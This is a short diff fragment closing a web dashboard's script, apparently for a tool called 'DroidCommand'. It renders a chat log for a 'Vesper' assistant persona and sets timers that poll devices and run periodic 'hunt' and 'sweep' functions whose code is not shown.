+  if(l.messages.length!==lastChatCount){
+    lastChatCount=l.messages.length;
+    const box=document.getElementById('vesperLog');
+    box.textContent=l.messages.length
+      ?l.messages.map(m=>(m.role==='user'?'You':(m.name||'Vesper'))+': '+m.content).join('\n\n')
+      :'she answers here — recon, war, or just talk';
+    box.scrollTop=box.scrollHeight;
+  }
+}
+brainLoad();brainPoll();chatPoll();
+
+/* ══════ AUTOPILOT ══════ */
+pollDevices();
+setInterval(pollDevices,4000);
+huntStatus();
+setInterval(huntStatus,2000);
+setInterval(autoSweep,45000);
+flowLine('SYS','DroidCommand appliance live — open it and it works. Arm only when hunting.');
+</script>
+</body>
+</html>
